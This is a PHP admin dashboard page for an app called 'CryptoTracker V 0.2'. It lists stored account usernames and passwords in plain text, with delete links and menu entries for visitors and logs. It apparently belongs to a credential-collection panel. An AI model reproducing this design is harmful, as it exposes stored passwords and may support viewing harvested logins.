<?php
session_start();
require_once("../inc/config.inc.php");
require_once("../system/system.inc.php");
require_once("../inc/cryptodb.inc.php");
require_once("../inc/encryption.inc.php");

if(!isset($_SESSION['session'])) {
  header("Location: index.php");
  exit();
}

$accountsdb = new CryptoDB("db/accounts.cryptodb", $password);

//$accountsdb->deleteRow("accounts", "2");
//$accountsdb->insertRow("accounts", '[ROW id="2"][COLUMN name="username"]habib@gmail.com[/COLUMN][COLUMN name="password"]ha[/COLUMN][/ROW]');
$accounts = $accountsdb->getRows("accounts");

?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>CryptoTracker V 0.2</title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <script src="assets/master.js" charset="utf-8"></script>
  </head>
  <body>
    <div class="menu">
      <ul>
        <li><a href="dashboard.php">Dashboard</a></li>
        <li><a href="visitors.php">Visitors</a></li>
        <li><a href="settings.php">Settings</a></li>
        <?php
        if($local_log) {
        ?>
        <li><a href="log.php">Local Log</a></li>
        <?php
        }
        ?>
        <li><a href="logout.php">Logout</a></li>
      </ul>
    </div>
    <div class="body">
      <div class="info-line">
        <?php
        $i = 1;
        foreach($accounts as $account) {
          $account = $accountsdb->getColumns($account);
          ?>
          <div class="info-box-upgraded account">
            <h1><?php echo htmlentities($account["username"]); ?></h1>
            <h2><?php echo htmlentities($account["password"]); ?></h2>
            <a href="delete.php?type=account&id=<?php echo $i; ?>"><div class="log" style="cursor : pointer;"></div></a>
          </div>
          <?php
          $i++;
        }
        ?>
      </div>
    </div>
  </body>
</html>
